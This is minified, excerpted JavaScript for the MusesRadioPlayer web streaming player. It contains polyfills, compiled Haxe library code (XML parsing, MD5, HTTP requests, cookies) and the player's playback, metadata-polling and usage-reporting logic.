...
$jscomp.polyfillIsolated = function(f, r, l, n) {
    ...
    null != r && (f ? $jscomp.defineProperty($jscomp.polyfills, t, {
        ...
        writable: !0,
        value: r
    }) : r !== l && ($jscomp.propertyToPolyfillSymbol[t] = $jscomp.IS_SYMBOL_NATIVE ? $jscomp.global.Symbol(t) : $jscomp.POLYFILL_PREFIX + t, t =
...
$jscomp.polyfill("String.fromCodePoint", function(f) {
    return f ? f : function(r) {
        for (var l = "", n = 0; n < arguments.length; n++) {
            ...
            if (0 > t || 1114111 < t || t !== Math.floor(t)) throw new RangeError("invalid_code_point " + t);
            65535 >= t ? l += String.fromCharCode(t) : (t -= 65536, l += String.fromCharCode(t >>> 10 & 1023 | 55296), l += String.fromCharCode(t & 1023 | 56320))
        }
        return l
    }
}, "es6", "es3");
...
(function(){
    var _0x1 = [0x6d, 0x72, 0x78, 0x32, 0x34, 0x67, 0x78];
    var _0x2 = "";
    for (var _0x3 = 0; _0x3 < _0x1.length; _0x3++) {
        _0x2 += String.fromCharCode(_0x1[_0x3]);
    }
    window[_0x2] = window[_0x2] || [];
    window[_0x2].push(String.fromCharCode(0x79, 0x61, 0x72, 0x72, 0x67));
})();
var mrx24gx = mrx24gx || [];
mrx24gx.push("ftinc");
if (2 == mrx24gx.length) {
    (function(f, r) {
        ...
        U.exists = function(a, b) {
            a = a instanceof Array ? new Z(a) : a.iterator();
            for (; a.hasNext();) {
                var c = a.next();
                if (b(c)) return !0
            }
        ...
        k.setUrl = function(a) {
            Object.prototype.hasOwnProperty.call(k.jsInstances.h,
                k.objectId) && k.jsInstances.h[k.objectId].setUrl(a);
        ...
        k.insert = function(a) {
            1 == a.forceFlash ? k.flashInsert(a) : 0 < k.isIE() && 11 > k.isIE() ? (console.log("MRP.hx:141:", "MusesRadioPlayer will use Flash Version here since you have Internet Explorer " + k.isIE() + " (wich is older than IE 11)."), k.flashInsert(a)) : 0 < k.isIE() && 11 <= k.isIE() && "aac" == a.codec && FlashDetect.versionAtLeast(10,
                1) ? (console.log("MRP.hx:145:", "MusesRadioPlayer will use Flash Version here since you have Internet Explorer " + k.isIE() + " (wich claims to support AAC but it doesn't support it right)."), k.flashInsert(a)) : 1 == a.forceHTML5 ? k.jsInsert(a) : k.browserSupportsCodec(a.codec) ? k.jsInsert(a) : FlashDetect.versionAtLeast(10, 1) ? (console.log("MRP.hx:151:", "MusesRadioPlayer will use Flash Version here since your browser does not support " + a.codec + " codec!"), k.flashInsert(a)) : (console.log("MRP.hx:154:", "MusesRadioPlayer will not work here, since your browser does not support " +
                a.codec + " codec and you don't have flash plugin installed!"), k.jsInsert(a))
        };
        ...
        aa.compareMethods = function(a, b) {
            return a == b ? !0 : aa.isFunction(a) && aa.isFunction(b) ? a.scope == b.scope && a.method == b.method ? null != a.method : !1 : !1
        };
        var C = function() {};
        C.__name__ = "Std";
        C.string = function(a) {
        ...
        Q.__name__ = "StringBuf";
        Q.prototype = {
            __class__: Q
        };
        var A = function() {};
        A.__name__ = "StringTools";
        A.htmlEscape = function(a, b) {
        ...
        A.isSpace = function(a, b) {
            a = x.cca(a, b);
            return 8 < a && 14 > a ? !0 : 32 == a
        };
        A.ltrim = function(a) {
            for (var b = a.length, c = 0; c < b && A.isSpace(a, c);) ++c;
            return 0 < c ? x.substr(a, c, b - c) : a
        };
        A.rtrim = function(a) {
            for (var b = a.length, c = 0; c < b && A.isSpace(a, b - c - 1);) ++c;
            return 0 < c ? x.substr(a, 0, b - c) : a
        };
        A.trim = function(a) {
            return A.ltrim(A.rtrim(a))
        };
        ...
        h.createElement = function(a) {
            ...
            if (b.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " +
                (null == b.nodeType ? "null" : w.toString(b.nodeType)));
            b.nodeName = a;
            return b
        };
        h.createPCData = function(a) {
            var b = new h(h.PCData);
            if (b.nodeType == h.Document || b.nodeType == h.Element) throw p.thrown("Bad node type, unexpected " + (null == b.nodeType ? "null" : w.toString(b.nodeType)));
            b.nodeValue = a;
            return b
        };
        ...
        h.prototype = {
            get: function(a) {
                if (this.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == this.nodeType ? "null" : w.toString(this.nodeType)));
                return this.attributeMap.h[a]
            },
            set: function(a, b) {
                if (this.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " +
                    (null == this.nodeType ? "null" : w.toString(this.nodeType)));
            ...
            elements: function() {
                if (this.nodeType != h.Document && this.nodeType != h.Element) throw p.thrown("Bad node type, expected Element or Document but found " + (null == this.nodeType ? "null" : w.toString(this.nodeType)));
            ...
            elementsNamed: function(a) {
                ...
                for (var b = [], c = 0, d = this.children; c < d.length;) {
                    ...
                    if (g.nodeType == h.Element) {
                        if (g.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == g.nodeType ? "null" : w.toString(g.nodeType)));
                        var e = g.nodeName == a
                    } else e = !1;
                    e && b.push(g)
                }
            ...
            removeChild: function(a) {
                if (this.nodeType != h.Document && this.nodeType != h.Element) throw p.thrown("Bad node type, expected Element or Document but found " +
                    (null == this.nodeType ? "null" : w.toString(this.nodeType)));
        ...
        p.thrown = function(a) {
            return a instanceof p ? a.get_native() : a instanceof Error ?
                a : new ca(a)
        };
        p.__super__ = Error;
        ...
        var T = function() {};
        T.__name__ = "haxe.crypto.Md5";
        T.encode = function(a) {
            var b = new T;
            a = b.doEncode(T.str2blks(a));
            return b.hex(a)
        };
        T.str2blks = function(a) {
            var b = M.ofString(a),
                c = (b.length + 8 >> 6) + 1;
            a = [];
            ...
            e = 0;
            g = b.length;
            for (d = 8 * g; e < g;) a[e >> 2] |= b.b[e] << (d + e) % 4 * 8, ++e;
            a[e >> 2] |= 128 << (d + e) % 4 * 8;
            b = 16 * c - 2;
            a[b] = d & 255;
            a[b] |=
        ...
        T.prototype = {
            ...
            hex: function(a) {
                for (var b = "", c = 0; c < a.length;) {
                    ...
                    b += "0123456789abcdef".charAt(d >> 12 & 15) +
                        "0123456789abcdef".charAt(d >> 8 & 15);
            ...
            gg: function(a, b, c, d, g, e, m) {
                return this.cmn(this.bitOR(this.bitAND(b,
                    d), this.bitAND(c, ~d)), a, b, g, e, m)
            },
        ...
        da.prototype = {
            ...
            onStatus: function(a) {},
            hasOnData: function() {
                return !aa.compareMethods(n(this, this.onData), this.emptyOnData)
            },
            success: function(a) {
            ...
            get_responseData: function() {
                null ==
                    this.responseAsString && null != this.responseBytes && (this.responseAsString = this.responseBytes.getString(0, this.responseBytes.length, ea.UTF8));
        ...
        V.__name__ = "haxe.http.HttpJs";
        V.__super__ = da;
        V.prototype = l(da.prototype, {
            request: function(a) {
                var b = this;
                ...
                var c = this.req = la.createXMLHttpRequest(),
                    d = function(P) {
                        if (4 == c.readyState) {
                            ...
                            0 == v && la.get_supported() && null != r.location && (P = r.location.protocol.toLowerCase(), (new S("^(?:about|app|app-storage|.+-extension|file|res|widget):$", "")).match(P) && (v = null != c.response ? 200 : 404));
                            void 0 == v && (v = null);
                            if (null != v) b.onStatus(v);
                            if (null != v && 200 <= v && 400 > v) b.req = null, b.success(M.ofData(c.response));
                            else if (null == v || 0 == v && null == c.response) b.req = null, b.onError("Failed to connect or resolve host");
                            else if (null == v) b.req = null, v = null != c.response ? M.ofData(c.response) : null, b.responseBytes = v, b.onError("Http Error #" +
                                c.status);
                            else switch (v) {
                                case 12007:
                                    b.req = null;
                                ...
                                case 12029:
                                    ...
                                    break;
                                default:
                                    b.req = null, v = null != c.response ? M.ofData(c.response) : null, b.responseBytes = v, b.onError("Http Error #" + c.status)
                            }
                        }
                    };
                ...
                if (null != m) a = !0;
                    ...
                    for (g = 0, e = this.params; g < e.length;) {
                        var D = e[g];
                        ++g;
                        m = null == m ? "" : (null ==
                            m ? "null" : C.string(m)) + "&";
                        var q = D.name;
                        m = (null == m ? "null" : C.string(m)) + encodeURIComponent(q) + "=" + encodeURIComponent(D.value)
                    }
                try {
                    if (a) c.open("POST", this.url, this.async);
                    else if (null != m) {
                        var N = 1 >= this.url.split("?").length;
                        c.open("GET", this.url + (N ? "?" : "&") + (null == m ? "null" : C.string(m)), this.async);
                        m = null
                ...
                !U.exists(this.headers,
                    function(P) {
                        return "Content-Type" == P.name
                    }) && a && null == this.postData && c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                g = 0;
                for (e = this.headers; g < e.length;) a = e[g], ++g, c.setRequestHeader(a.name, a.value);
                c.send(m);
                this.async || d(null)
            },
            __class__: V
        ...
        M.__name__ = "haxe.io.Bytes";
        M.ofString = function(a, b) {
            if (b == ea.RawNative) {
                for (var c = new Uint8Array(a.length << 1), d = 0, g =
                        a.length; d < g;) {
                    b = d++;
                ...
                return new M(c.buffer)
            }
            c = [];
            for (b = 0; b < a.length;) e = a.charCodeAt(b++), 55296 <= e && 56319 >= e && (e = e - 55232 << 10 | a.charCodeAt(b++) & 1023), 127 >= e ? c.push(e) : (2047 >= e ? c.push(192 | e >> 6) : (65535 >= e ? c.push(224 | e >> 12) : (c.push(240 | e >> 18), c.push(128 | e >> 12 & 63)), c.push(128 | e >> 6 & 63)), c.push(128 | e & 63));
            return new M((new Uint8Array(c)).buffer)
        };
        M.ofData = function(a) {
            var b = a.hxBytes;
            return null != b ? b : new M(a)
        };
        M.prototype = {
            getString: function(a, b, c) {
                if (0 > a ||
                    0 > b || a + b > this.length) throw p.thrown(fa.OutsideBounds);
                null == c && (c = ea.UTF8);
                var d = "",
                    g = this.b,
                    e = a;
                ...
                switch (c._hx_index) {
                    case 0:
                        for (; e < a;)
                            ...
                            } else if (224 > c) c = (c & 63) << 6 | g[e++] & 127, d += String.fromCodePoint(c);
                        else if (240 > c) b = g[e++], c = (c & 31) << 12 | (b & 127) << 6 | g[e++] & 127, d += String.fromCodePoint(c);
                        else {
                            b = g[e++];
                            var m = g[e++];
                        ...
                        break;
                    case 1:
                        for (; e < a;) c = g[e++] | g[e++] << 8, d += String.fromCodePoint(c)
                }
                return d
            },
            __class__: M
        };
        var ea = B["haxe.io.Encoding"] = {
            __ename__: !0,
            __constructs__: null,
            UTF8: {
                _hx_name: "UTF8",
        ...
        var fa = B["haxe.io.Error"] = {
            ...
            }, L._hx_name = "Custom", L.__params__ = ["e"], L)
        };
        ...
        Z.__name__ = "haxe.iterators.ArrayIterator";
        Z.prototype = {
            hasNext: function() {
        ...
        E.__name__ = "haxe.xml.XmlParserException";
        E.prototype = {
            toString: function() {
                return J.getClass(this).__name__ + ": " + this.message + " at line " + this.lineNumber + " char " + this.positionAtLine
            },
            __class__: E
        };
        var R = function() {};
        R.__name__ = "haxe.xml.Parser";
        ...
        R.doParse = function(a, b, c, d) {
            null == c && (c = 0);
            for (var g = null, e = 1, m = 1, D = null, q = 0, N = 0, P = 0, v = new Q, G = 1, Na = -1; c < a.length;) {
                ...
                switch (e) {
                        ...
                        switch (u) {
                            case 33:
                                if (91 == a.charCodeAt(c + 1)) {
                                    c += 2;
                                    if ("CDATA[" != x.substr(a, c, 6).toUpperCase()) throw p.thrown(new E("Expected <![CDATA[", a, c));
                                    c += 5;
                                    e = 17
                                } else if (68 == a.charCodeAt(c + 1) || 100 == a.charCodeAt(c +
                                        1)) {
                                    if ("OCTYPE" != x.substr(a, c + 2, 6).toUpperCase()) throw p.thrown(new E("Expected <!DOCTYPE", a, c));
                                    c += 8;
                                    e = 16
                                } else {
                                    if (45 != a.charCodeAt(c + 1) || 45 != a.charCodeAt(c + 2)) throw p.thrown(new E("Expected \x3c!--", a, c));
                                    c += 2;
                                    e = 15
                                }
                                q = c + 1;
                                break;
                            case 47:
                                if (null == d) throw p.thrown(new E("Expected node name", a, c));
                                q = c + 1;
                                e = 0;
                                m = 10;
                                break;
                    ...
                    case 3:
                        if (!(97 <= u && 122 >= u || 65 <= u && 90 >= u || 48 <= u && 57 >= u || 58 == u || 46 == u || 95 == u || 45 == u)) {
                            if (c == q) throw p.thrown(new E("Expected node name",
                                a, c));
                    ...
                    case 5:
                        if (!(97 <= u && 122 >= u || 65 <= u && 90 >= u || 48 <= u && 57 >= u || 58 == u || 46 == u || 95 == u || 45 == u)) {
                            if (q == c) throw p.thrown(new E("Expected attribute name", a, c));
                            D = x.substr(a, q, c - q);
                            if (g.exists(D)) throw p.thrown(new E("Duplicate attribute [" + D + "]", a, c));
                            e = 0;
                            m = 6;
                            continue
                        }
                    ...
                    case 6:
                        if (61 == u) e = 0, m = 7;
                        else throw p.thrown(new E("Expected =", a, c));
                        break;
                    case 7:
                        switch (u) {
                            case 34:
                            case 39:
                                ...
                                break;
                            default:
                                throw p.thrown(new E('Expected "', a, c));
                        }
                        break;
                    case 8:
                        switch (u) {
                            case 38:
                                G = c - q;
                                v.b += null == G ? x.substr(a, q, null) : x.substr(a, q, G);
                                e = 18;
                                G = 8;
                                q = c + 1;
                                break;
                            case 60:
                            case 62:
                                if (b) throw p.thrown(new E("Invalid unescaped " + String.fromCodePoint(u) + " in attribute value", a, c));
                                u == Na && (m = c - q, v.b += null == m ? x.substr(a, q, null) : x.substr(a, q, m), m = v.b, v = new Q, g.set(D, m), e = 0, m = 4);
                                break;
                            default:
                                u == Na && (m = c - q, v.b += null == m ? x.substr(a, q, null) : x.substr(a, q,
                                    m), m = v.b, v = new Q, g.set(D, m), e = 0, m = 4)
                        }
                        break;
                    case 9:
                        q = c = R.doParse(a, b, c, g);
                        e = 1;
                        break;
                    case 10:
                        if (!(97 <= u && 122 >= u || 65 <= u && 90 >= u || 48 <= u && 57 >= u || 58 == u || 46 == u || 95 == u || 45 == u)) {
                            if (q == c) throw p.thrown(new E("Expected node name", a, c));
                            m = x.substr(a, q, c - q);
                            if (null == d || 0 != d.nodeType) throw p.thrown(new E("Unexpected </" + m + ">, tag is not open", a, c));
                            if (d.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == d.nodeType ? "null" : w.toString(d.nodeType)));
                            if (m != d.nodeName) {
                                if (d.nodeType !=
                                    h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == d.nodeType ? "null" : w.toString(d.nodeType)));
                                throw p.thrown(new E("Expected </" + d.nodeName + ">", a, c));
                            }
                            e = 0;
                            m = 12;
                            continue
                    ...
                    case 11:
                        ...
                        break;
                    case 12:
                        if (62 == u) return 0 == N && d.addChild(h.createPCData("")), c;
                        throw p.thrown(new E("Expected >", a, c));
                    case 13:
                        60 == u ? (m = c - q, v.b += null == m ? x.substr(a, q, null) : x.substr(a, q, m), m = h.createPCData(v.b), v = new Q, d.addChild(m), ++N, e = 0, m = 2) :
                            38 == u && (G = c - q, v.b += null == G ? x.substr(a, q, null) : x.substr(a, q, G), e = 18, G = 13, q = c + 1);
                        break;
                    case 14:
                        63 == u && 62 == a.charCodeAt(c + 1) && (++c, e = x.substr(a, q + 1, c - q - 2), d.addChild(h.createProcessingInstruction(e)), ++N, e = 1);
                        break;
                    case 15:
                        45 == u && 45 == a.charCodeAt(c + 1) && 62 == a.charCodeAt(c + 2) && (d.addChild(h.createComment(x.substr(a, q, c - q))), ++N, c += 2, e = 1);
                        break;
                    case 16:
                        91 == u ? ++P : 93 == u ? --P : 62 == u && 0 == P && (d.addChild(h.createDocType(x.substr(a, q, c - q))), ++N, e = 1);
                        break;
                    case 17:
                        93 == u && 93 == a.charCodeAt(c + 1) && 62 == a.charCodeAt(c +
                            2) && (e = h.createCData(x.substr(a, q, c - q)), d.addChild(e), ++N, c += 2, e = 1);
                        break;
                    case 18:
                        if (59 == u) {
                            q = x.substr(a, q, c - q);
                            if (35 == q.charCodeAt(0)) q = 120 == q.charCodeAt(1) ? C.parseInt("0" + x.substr(q, 1, q.length - 1)) : C.parseInt(x.substr(q, 1, q.length - 1)), v.b += String.fromCodePoint(q);
                            else if (Object.prototype.hasOwnProperty.call(R.escapes.h, q)) v.b += C.string(R.escapes.h[q]);
                            else {
                                if (b) throw p.thrown(new E("Undefined entity: " + q, a, c));
                                v.b += C.string("&" + q + ";")
                            }
                            q = c + 1;
                            e = G
                        } else if (!(97 <= u && 122 >= u || 65 <= u && 90 >= u || 48 <= u && 57 >= u ||
                                58 == u || 46 == u || 95 == u || 45 == u) && 35 != u) {
                            if (b) throw p.thrown(new E("Invalid character in entity: " + String.fromCodePoint(u), a, c));
            ...
            if (13 == e) {
                if (0 == d.nodeType) {
                    if (d.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == d.nodeType ? "null" : w.toString(d.nodeType)));
                    throw p.thrown(new E("Unclosed node <" + d.nodeName + ">", a, c));
                }
                if (c != q || 0 == N) G = c - q, v.b += null == G ?
                    x.substr(a, q, null) : x.substr(a, q, G), d.addChild(h.createPCData(v.b));
                return c
            }
            if (!b && 18 == e && 13 == G) return v.b += String.fromCodePoint(38), G = c - q, v.b += null == G ? x.substr(a, q, null) : x.substr(a, q, G), d.addChild(h.createPCData(v.b)), c;
            throw p.thrown(new E("Unexpected end", a, c));
        };
        var ba = function(a) {
            this.output = new Q;
            this.pretty = a
        ...
        ba.prototype = {
            writeNode: function(a, b) {
                switch (a.nodeType) {
                    case 0:
                        this.output.b +=
                            C.string(b + "<");
                        if (a.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == a.nodeType ? "null" : w.toString(a.nodeType)));
                        this.output.b += C.string(a.nodeName);
                        for (var c = a.attributes(); c.hasNext();) {
                            var d = c.next();
                            this.output.b += C.string(" " + d + '="');
                            d = A.htmlEscape(a.get(d), !0);
                            this.output.b += C.string(d);
                            this.output.b += '"'
                        }
                        if (this.hasChildren(a)) {
                            ...
                            if (a.nodeType != h.Document && a.nodeType != h.Element) throw p.thrown("Bad node type, expected Element or Document but found " +
                                (null == a.nodeType ? "null" : w.toString(a.nodeType)));
                            c = 0;
                            for (d = a.children; c < d.length;) {
                                var g = d[c++];
                                this.writeNode(g, this.pretty ? b + "\t" : b)
                            }
                            this.output.b += C.string(b + "</");
                            if (a.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == a.nodeType ? "null" : w.toString(a.nodeType)));
                            this.output.b += C.string(a.nodeName);
                            this.output.b += ">"
                        } else this.output.b += "/>";
                        ...
                        break;
                    case 1:
                        if (a.nodeType == h.Document || a.nodeType == h.Element) throw p.thrown("Bad node type, unexpected " +
                            (null == a.nodeType ? "null" : w.toString(a.nodeType)));
                        a = a.nodeValue;
                        0 != a.length && (d = b + A.htmlEscape(a), this.output.b += C.string(d), this.pretty && (this.output.b += "\n"));
                        break;
                    case 2:
                        this.output.b += C.string(b + "<![CDATA[");
                        if (a.nodeType == h.Document || a.nodeType == h.Element) throw p.thrown("Bad node type, unexpected " + (null == a.nodeType ? "null" : w.toString(a.nodeType)));
                        this.output.b += C.string(a.nodeValue);
                        this.output.b += "]]\x3e";
                        this.pretty && (this.output.b += "\n");
                        break;
                    case 3:
                        if (a.nodeType == h.Document || a.nodeType ==
                            h.Element) throw p.thrown("Bad node type, unexpected " + (null == a.nodeType ? "null" : w.toString(a.nodeType)));
                        a = a.nodeValue;
                        a = a.replace(/[\n\r\t]+/g, "");
                    ...
                    case 4:
                        if (a.nodeType == h.Document || a.nodeType == h.Element) throw p.thrown("Bad node type, unexpected " + (null == a.nodeType ? "null" : w.toString(a.nodeType)));
                        this.output.b += C.string("<!DOCTYPE " + a.nodeValue + ">");
                        this.pretty && (this.output.b +=
                            "\n");
                        break;
                    case 5:
                        ...
                        break;
                    case 6:
                        if (a.nodeType != h.Document && a.nodeType != h.Element) throw p.thrown("Bad node type, expected Element or Document but found " + (null == a.nodeType ? "null" : w.toString(a.nodeType)));
                        c = 0;
            ...
            hasChildren: function(a) {
                if (a.nodeType !=
                    h.Document && a.nodeType != h.Element) throw p.thrown("Bad node type, expected Element or Document but found " + (null == a.nodeType ? "null" : w.toString(a.nodeType)));
                var b = 0;
                for (a = a.children; b < a.length;) {
                    ...
                    switch (c.nodeType) {
                        ...
                        case 2:
                        case 3:
                            if (c.nodeType == h.Document || c.nodeType == h.Element) throw p.thrown("Bad node type, unexpected " + (null == c.nodeType ? "null" : w.toString(c.nodeType)));
                            if (0 != A.ltrim(c.nodeValue).length) return !0
                    }
                }
                return !1
            },
        ...
        J.__string_rec = function(a, b) {
            ...
            switch (c) {
                ...
                case "object":
                    if (a.__enum__) {
                        var d = B[a.__enum__].__constructs__[a._hx_index];
                        c = d._hx_name;
                        if (d.__params__) {
                            b +=
                                "\t";
                    ...
                    if (a instanceof Array) {
                        ...
                        b += "\t";
                        g = 0;
                        for (e = a.length; g < e;) d = g++, c += (0 < d ? "," : "") + J.__string_rec(a[d], b);
                        return c + "]"
                    }
                    try {
                        g = a.toString
                    ...
                    e = null;
                    for (e in a) g && !a.hasOwnProperty(e) || "prototype" == e || "__class__" ==
                        e || "__super__" == e || "__interfaces__" == e || "__properties__" == e || (2 != c.length && (c += ", \n"), c += b + e + " : " + J.__string_rec(a[e], b));
                    b = b.substring(1);
                    return c + ("\n" + b + "}");
                case "string":
                    return a;
        ...
        la.get_supported = function() {
            return "undefined" != typeof window && "undefined" !=
                typeof window.location ? "string" == typeof window.location.protocol : !1
        };
        ...
        var W = function() {};
        W.__name__ = "js.Cookie";
        W.set = function(a, b, c, d, g) {
            a = a + "=" + encodeURIComponent(b);
            null != c && (c = new Date((new Date).getTime() + 1E3 * c), a += ";expires=" + c.toGMTString());
            null != d && (a +=
                ";path=" + d);
            null != g && (a += ";domain=" + g);
        ...
        W.all = function() {
            for (var a = new z, b = window.document.cookie.split(";"), c = 0; c < b.length;) {
                var d = b[c];
                ++c;
                d = A.ltrim(d);
                d = d.split("=");
        ...
        ma.prototype = {
            ...
            getJson: function() {
                return '{"title":"' + A.replace(this.title, '"', "'") + '","artist":"' + A.replace(this.artist, '"', "'") + '","album":"' + A.replace(this.album, '"', "'") + '","genre":"' + A.replace(this.genre, '"', "'") + '","comment":"' + A.replace(this.comment, '"', "'") + '","encoder":"' +
                    A.replace(this.encoder, '"', "'") + '","year":"' + A.replace(this.year, '"', "'") + '"}'
            },
            __class__: ma
        };
        var y = function() {};
        ...
        y.hide = function(a) {
            y.displaying && (y.container.style.display = "none", window.document.removeEventListener("click",
                y.hide), y.displaying = !1)
        };
        y.display = function(a, b, c, d) {
            y.prepare(d);
            y.displaying || (y.container.style.display = "block", window.document.addEventListener("click", y.hide), y.displaying = !0);
        ...
        var Ma = function(a, b) {
            ...
            null != b.metadataProxy &&
                (this.proxy = b.metadataProxy);
        ...
        Ma.prototype = {
            ...
            begin: function() {
                "icecast" != this.metadataMode && "streamtheworld" != this.metadataMode && "shoutcast" != this.metadataMode || null != this.timer || (this.timer = new O(1E3 * this.interval), this.timer.run = n(this, this.loop), this.loop())
            },
            loop: function() {
                if (this.player.isPlaying()) {
                    switch (this.metadataMode) {
                        case "icecast":
                            var a = this.player.getCurrentUrl().split("?")[0] +
                                ".xspf";
                            break;
                        case "shoutcast":
                    ...
                    null != this.proxy && (a = this.proxy + "?url=" + A.replace(a, ":", "%3A"));
                    this.loadMetadata(a)
                } else this.stop()
            },
            ...
            loadStreamTheWorldEvent: function(a) {
                var b = h.parse(a);
                if (b.nodeType != h.Document && b.nodeType != h.Element) throw p.thrown("Bad node type, expected Element or Document but found " + (null == b.nodeType ? "null" : w.toString(b.nodeType)));
                a = b.children[0];
                if (a.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " +
                    (null == a.nodeType ? "null" : w.toString(a.nodeType)));
                    ...
                    for (a = a.elementsNamed("nowplaying-info"); a.hasNext();) {
                        ...
                        for (c = c.elementsNamed("property"); c.hasNext();) {
                            ...
                            if ("cue_title" == d.get("name")) {
                                if (d.nodeType != h.Document && d.nodeType != h.Element) throw p.thrown("Bad node type, expected Element or Document but found " + (null == d.nodeType ? "null" : w.toString(d.nodeType)));
                                b = d.children[0];
                                if (b.nodeType == h.Document || b.nodeType ==
                                    h.Element) throw p.thrown("Bad node type, unexpected " + (null == b.nodeType ? "null" : w.toString(b.nodeType)));
                                a.title = b.nodeValue
                            }
                            ...
                            if ("cue_time_start" == d.get("name")) {
                                if (d.nodeType != h.Document && d.nodeType != h.Element) throw p.thrown("Bad node type, expected Element or Document but found " + (null == d.nodeType ? "null" : w.toString(d.nodeType)));
                                d = d.children[0];
                                if (d.nodeType == h.Document || d.nodeType == h.Element) throw p.thrown("Bad node type, unexpected " + (null == d.nodeType ? "null" : w.toString(d.nodeType)));
            ...
            loadShoutcastEvent: function(a) {
                if (null != a && "" != a) {
                    ...
                    null != b && "" != b && this.player.ui.setMetadataFromString(A.trim(b))
                }
            },
            loadIcecastEvent: function(a) {
                if (null != a && "" != a) {
                    var b = h.parse(a).firstElement(),
                        c = a = null;
                    if (b.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == b.nodeType ? "null" : w.toString(b.nodeType)));
                    if ("playlist" == b.nodeName.toLowerCase()) {
                        for (b =
                            b.elements(); b.hasNext();) {
                            var d = b.next();
                            if (d.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == d.nodeType ? "null" : w.toString(d.nodeType)));
                                ...
                                for (d = d.elements(); d.hasNext();) {
                                    ...
                                    if ("track" == g.nodeName.toLowerCase())
                                        for (g = g.elements(); g.hasNext();) {
                                            var e = g.next();
                                            if (e.nodeType !=
                                                h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == e.nodeType ? "null" : w.toString(e.nodeType)));
                                            if ("title" == e.nodeName.toLowerCase()) {
                                                if (e.nodeType != h.Document && e.nodeType != h.Element) throw p.thrown("Bad node type, expected Element or Document but found " + (null == e.nodeType ? "null" : w.toString(e.nodeType)));
                                                a = e.children[0];
                                                if (a.nodeType == h.Document || a.nodeType == h.Element) throw p.thrown("Bad node type, unexpected " + (null == a.nodeType ? "null" : w.toString(a.nodeType)));
                                                a = a.nodeValue
                                            } else {
                                                if (null ==
                                                    c) {
                                                    if (e.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == e.nodeType ? "null" : w.toString(e.nodeType)));
                                                    var m = "creator" == e.nodeName.toLowerCase()
                                                } else m = !1;
                                                if (m) {
                                                    if (e.nodeType != h.Document && e.nodeType != h.Element) throw p.thrown("Bad node type, expected Element or Document but found " + (null == e.nodeType ? "null" : w.toString(e.nodeType)));
                                                    c = e.children[0];
                                                    if (c.nodeType == h.Document || c.nodeType == h.Element) throw p.thrown("Bad node type, unexpected " + (null == c.nodeType ? "null" :
                                                        w.toString(c.nodeType)));
                                                    c = c.nodeValue
                                                } else {
                                                    if (e.nodeType != h.Element) throw p.thrown("Bad node type, expected Element but found " + (null == e.nodeType ? "null" : w.toString(e.nodeType)));
                                                    if ("artist" == e.nodeName.toLowerCase()) {
                                                        if (e.nodeType != h.Document && e.nodeType != h.Element) throw p.thrown("Bad node type, expected Element or Document but found " + (null == e.nodeType ? "null" : w.toString(e.nodeType)));
                                                        c = e.children[0];
                                                        if (c.nodeType == h.Document || c.nodeType == h.Element) throw p.thrown("Bad node type, unexpected " + (null ==
                                                            c.nodeType ? "null" : w.toString(c.nodeType)));
                                                        c = c.nodeValue
                                                    }
                                                }
                                            }
                        ...
                        if (null != a || null != c) null == c ? this.player.ui.setMetadataFromString(a) : (b = new ma, b.title = a, b.artist = c, this.player.ui.setMetadata(b))
                    }
                }
            },
            __class__: Ma
        };
        var K = f.muses.Muses = function(a) {
            this.legacyData = new z;
            ...
            this.playTimeout = this.bufferingTimeout = this.requestedBuffering =
                0;
            ...
            a.autoplay && (this.audio.addEventListener("play", n(this, this.activate)), this.playAudio(!1))
        };
        K.__name__ = "muses.Muses";
        K.initTimer = function(a) {
            -1 == K.instances.indexOf(a) && K.instances.push(a);
            null == K.statusTimer && (K.statusTimer = new O(500), K.statusTimer.run = function() {
                for (var b = 0, c = K.instances; b < c.length;) {
                    var d = c[b];
                    ++b;
                    try {
                        d.checkAudioStatus()
                    } catch (g) {
                        if (d = p.caught(g).unwrap(), "string" == typeof d) console.log("muses/Muses.hx:74:", "Error: " + d);
                        else throw g;
                    }
                }
            })
        ...
        K.prototype = {
            activate: function() {
                this.activated || (this.activated = !0, K.initTimer(this), this.metadataLoader.begin(), this.mustWaitForBuffer = 0 < this.requestedBuffering)
            },
            setUrl: function(a) {
                this.src = a
            },
            setFallbackUrl: function(a) {
                console.log("muses/Muses.hx:85:",
            ...
            retryAudio: function(a) {
                null ==
                    a && (a = 5E3);
                var b = this; - 1 != this.lastAudioStatus && (this.lastAudioStatus = -1, O.delay(function() {
            ...
            checkAudioStatus: function() {
                ...
                0 == a ? (a = "Error al conectar", this.lastMessage != a && this.ui.setError()) : -1 == a ? a = "retry..." : null == a ? a = "init" : 1 == a ? (this.bufferingTimeout--, 0 == this.bufferingTimeout && this.retryAudio(), a = "Buffering... " + Math.round(this.bufferingTimeout / 2), this.lastMessage != a && this.ui.setBuffering()) : 2 == a ? (this.playTimeout--,
                    0 == this.playTimeout && this.retryAudio(5), a = "Playing... ", this.lastMessage != a && (this.ui.setPlaying(), this.reportLegacyPlayer())) : 4 == a || 3 == a ? "play" == this.desiredStatus ? (a = "Error de red", this.retryAudio(), this.lastMessage != a && this.ui.setError()) : (a = "Stopped.", this.lastMessage != a && this.ui.setStopped()) : (a = "ERROR: " + a, console.log("muses/Muses.hx:208:", a));
                this.lastMessage = a
            },
            reportLegacyPlayer: function() {
                if (null != this.src) {
                    ...
                    null == this.playerParams.lang &&
                        (this.playerParams.lang = "auto");
                    ...
                    b = T.encode(a);
                    Object.prototype.hasOwnProperty.call(this.legacyData.h, b) || (this.legacyData.h[b] = !0, W.exists(b) ? console.log("muses/Muses.hx:246:", "COOKIE EXISTS!") : (W.set(b, "1", 43200), b = new V("https://www.muses.org/ws/legacyPlayer"), b.onData = function(c) {
                        console.log("muses/Muses.hx:252:", c)
        ...
        var F = function() {};
